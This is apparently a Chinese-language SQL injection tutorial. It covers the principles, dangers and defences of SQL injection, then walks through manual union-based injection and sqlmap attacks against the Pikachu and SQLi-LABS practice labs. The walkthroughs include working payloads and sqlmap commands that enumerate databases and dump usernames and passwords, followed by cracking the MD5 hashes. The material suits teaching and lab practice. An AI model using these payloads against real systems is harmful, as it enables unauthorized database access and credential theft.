## 一、SQL注入原理

  * 在 **数据交互** 中， **前端的数据传入到后台处理** 时， **没有做严格的判断** ，导致其传入的“数据” **拼接** 到SQL语句中后， **被当作SQL语句的一部分执行** 。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。简而言之就是,由于用户不可控输入，攻击者可以任意的输入恶意的sql语句，使原始的查询语句的语义发生改 变。从而对数据库或操作系统产生风险。  
![SQL注入原理](https://image.3001.net/images/20220430/1651296670_626cc99e068f3657babe4.png!small)  
![SQL注入原理](https://image.3001.net/images/20220430/1651296674_626cc9a22e0bea8c32dfc.png!small)

  *  **`注意:注入攻击的本质，就是把用户输入的数据当做代码执行。`**

  *  **`注入漏洞最根源的问题是,没有安全编码规范`**

### 实现注入攻击的两个关键条件(重点)

  * 第一个：用户能控制输入——用户能控制输入变量

  * 第二个：原本程序要执行的代码， **拼接** 了用户输入的数据。（正是拼接的这个过程导致了代码的注入）

### 注入漏洞经常出现的位置

  * 常发生于用户和服务交互处（增删改查操作），ajax，接口等等

## 二、SQL注入危害

  * SQL注入上得了机器权限，下得了数据。攻击者利用SQL注入漏洞，带来的风险有很 多，例如数据库被拖库，管理员和重要人员信息泄露，甚至还能通过SQL注入漏洞直 接获取webshell或者服务器系统权限等等。

### 具体危害如下

  * 绕过登录验证：使用万能密码登录网站后台等

  * 获取敏感数据：获取网站管理员帐号、密码等

  * 文件系统操作：列目录，读取、写入文件等

  * 注册表操作：读取、写入、删除注册表等

  * 执行系统命令：远程执行命令

## 三、SQL注入防御

  * 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；

  * 预编译参数化查询 (提前编译SQL语句，将所有的用户输入都当做『数据』，而非『语法』)在设计与数据库连接并访问数据时，在需要填入数值或数据的地方，使用参数（Parameter）来给值

  * 目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!

  *  **采用黑名单、白名单** 等形式对用户提交的信息进行过滤，一旦发现用户参数中出现敏感的词或者内容，则将其删除，使得执行失败。

  * 安全设计遵循“数据与代码分离”原则

  * 使用WAF(web应用防护墙)等安全产品

`注:最好的防御，就是内部先发现 。`

### 如何发现被SQL注入攻击?

> 日志监控--->蜜罐数据--->异常报警

  * 监测方面目前大多都是：日志监控+waf。日志推荐走数据库日志，越是离资源操作 近的地方，越是容易做到真正的安全。数据库日志容易解析，语法出错的、语法读 Info表的，都明确是黑客嘛，还能帮我们发现SQL注入点。

  * 蜜罐方面：数据库里可放置一些蜜罐数据的帐号和密码。假如这有一个服务，可以先从日志入手，发现请求恶意异常时，自动转发蜜罐。比如用户表里，前几十行里，做些用户名和密码 进行，实际上没有人用，一旦被登录，立马报警。

## 四、SQL注入分类

  * 按照数据类型分类

    1. 数字型

    2. 字符型

  * 按照注入点分类(哪些地方存在sql注入)

    1. GET型（注入点在UR）

    2. POST型（注入点在表单输入框中，且数据提交方式是POST，如登录框、注册框）

    3. COOKIE型（注入点在cookie中）

    4. Header型(注入点在头部)

    5. 其他(请求报文中只要能够被后端脚本引擎接受的数据均可SQL注入)

  * 按照数据获取的方式分类

    1. 回显注入--联合查询

    2. 报错注入--报错回显(extractvalue(), updatexml(), floor())

    3. 盲注（没有错误回显）

      * bool盲注--逻辑语句判断查询出的字符

      * 时间盲注--利用页面演示情况判断数据库中的数据

 **注意:**

 **`盲注，time盲注，报错注入，union注入`** ,这些注入漏洞出现频率较高

 **`在不影响正常服务的情况下，拼接查询算最高危害的，接下来就是union。`**

 **`比较好检测的注入有：盲注，time盲注，报错注入等`**

## 五、SQL注入流程

![1](https://image.3001.net/images/20220430/1651296677_626cc9a5b4131a9031a09.jpg!small)

### 流程细节

  1. 找疑似注入点--找数据输入的地方

  2. 判断注入点----找输入点中与数据库有交互的地方

  3. 确认注入存在----确认找到于数据库有交互的地方是不是存在sql注入

  4. 选择攻击目标----选择攻击后需要达到的目的

  5. 根据选择的目标构sql语言

  6. 提交sql语言

  7. 判断网页响应是否与目标一致

    1. 后端语言对输入的sql语句有限制，考虑重构sql语句

    2. 选择的目标在当前网站不具备成功的条件，考虑重新选择目标

  8. 响应符合预期，则完成注入

## 六、手工注入实例

说明：靶场环境为pakachu 注入漏洞数字型

参考文章：[Pikachu漏洞平台练习七天的博客-CSDN博客pikachu漏洞练习平台](https://blog.csdn.net/sycamorelg/article/details/110823668)

### 1、判断是否存在SQL注入点

    
    
    我们通过在变量后加payload来判断注入点：
    and 1=1 /and 1=2 /' 通过输入这些payload后的回显页面，我们轻松看出是否存在注入；
    另外MYSQL有三种常用的注释符：
    -- 该注释符后面有一个空格,单行注释；
    /* */ 注释符号内的内容，多行注释；
    # 对该行#后面的内容进行注释，单行注释。
    

### 2、判断注入类型

a) 数字型注入

    
    
    测试步骤：
    1. 加单引号，这时sql语句后面多了一个单引号，会报错；
    2. 加and 1=1，语句正常执行，页面与原始页面相同；
    3. 加and 1=2，语句也可以正常执行，但页面会与原始网页存在差距
    如满足以上三点，可以判断此处存在数字型注入
    

b) 字符型注入

    
    
    字符型注入的sql语句为：　　　　
    select * from 【表名】where name = 'zhangsan’
    同样加单引号，但后面要带上注释符来注释掉后面多余的单引号，具体还是拿sql语句直观看一下：　
    
    select * from 【表名】where name = 'zhangsan’ and 1=1 #'
    第二个单引号是我们自己加的，用来'闭合前一个引号以便我们在后面继续加代码，#用来注释掉最后面多余的'
    
    当回显正常时我们可以判断此处为字符型注入。
    

c) 其他类型注入（此处不做展示）

### 3、判断字段数

    
    
    order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。若输入数值为n时报错，那么表示没有n个字段，总的字段数为n-1。
    

![image-20220306183115922](https://image.3001.net/images/20220430/1651296681_626cc9a98bc18fffcd222.png!small)

  

### 4、判断回显位置

    
    
    通过上一步我们可以知道字段数，然后通过union select 1,2,3 ······n （n的数值为字段数）来判断回显位置
    

![image-20220306183616617](https://image.3001.net/images/20220430/1651296684_626cc9ac003a5bfae69c2.png!small)

### 5、判断数据库名

![image-20220306183844421](https://image.3001.net/images/20220430/1651296686_626cc9aebe6f950deb93a.png!small)

或者

    
    
    id=1 union select 1,group_concat(schema_name) from information_schema.schemata
    

![image-20220306184545295](https://image.3001.net/images/20220430/1651296689_626cc9b15bc036a8926f3.png!small)

### 6、确定表名

    
    
    id=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
    

![image-20220306184917348](https://image.3001.net/images/20220430/1651296697_626cc9b9764c07e8cbd45.png!small)

### 7、确定字段名

    
    
    id=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()
    

![image-20220306185531447](https://image.3001.net/images/20220430/1651296699_626cc9bbd1a1aaaa4c97e.png!small)

### 8、获取用户名与密码

    
    
    7、获取"username"、"password"的值 
    id=1 union select group_concat(username),group_concat(password) from pikachu.users
    或者
    id=1 union select 1,group_concat(username,'---',password) from users
    或者
    id=1 union select username,password from users
    

![image-20220306190042138](https://image.3001.net/images/20220430/1651296702_626cc9be3638bb4d5e953.png!small)

### 9、MD5解密—破解密码

![img](https://image.3001.net/images/20220430/1651296705_626cc9c1017ba839622b1.png!small)

## 七、sqlmap注入实例

说明：靶场环境为SQLi-LABS Page-1

### 1、判断是否存在注入点

    
    
    sqlmap -u "http://192.168.137.1:91/Less-1/?id=1"
    

![image-20220426234926594](https://image.3001.net/images/20220430/1651296707_626cc9c3ace3423fdb2c4.png!small)

**出现如图类似的内容表示存在注入点：**

![image-20220426235009944](https://image.3001.net/images/20220430/1651296710_626cc9c6574bf10fd46b2.png!small)

  

### 2、爆数据库名

 **爆出所有数据库信息**

    
    
    sqlmap -u "http://192.168.137.1:91/Less-1/?id=1" --dbs
    

![image-20220426235056110](https://image.3001.net/images/20220430/1651296713_626cc9c915e56a9382653.png!small)

![image-20220426235132746](https://image.3001.net/images/20220430/1651296715_626cc9cbeeb1eee9f002e.png!small)

  
**爆出当前数据库信息**

    
    
    sqlmap -u "http://192.168.137.1:91/Less-1/?id=1" --current-db
    

![image-20220426235236536](https://image.3001.net/images/20220430/1651296718_626cc9cef2548502e5b44.png!small)

  

### 3、指定库名，列出所有元素

    
    
    sqlmap -u "http://192.168.137.1:91/Less-1/?id=1" -D security --tables
    

![image-20220426233507589](https://image.3001.net/images/20220430/1651296722_626cc9d223562309e12a7.png!small)

![image-20220426233538512](https://image.3001.net/images/20220430/1651296724_626cc9d4a9b19e2b60a02.png!small)

  

### 4、指定库名、表名，列出所有字段

    
    
    sqlmap -u "http://192.168.137.1:91/Less-1/?id=1" -D security -T users --columns
    

![image-20220426233646944](https://image.3001.net/images/20220430/1651296727_626cc9d718e1f0f39d0a2.png!small)

![image-20220426233719663](https://image.3001.net/images/20220430/1651296729_626cc9d98430cb3471fa5.png!small)

### 5、指定库名、表名、字段名，列出指定字段

    
    
    sqlmap -u "http://192.168.137.1:91/Less-1/?id=1" -D security --T users -C username,password --dump
    

![image-20220426234727983](https://image.3001.net/images/20220430/1651296735_626cc9df0009e6fb7a6ba.png!small)

![image-20220426234830027](https://image.3001.net/images/20220430/1651296737_626cc9e17ad802c4ad104.png!small)

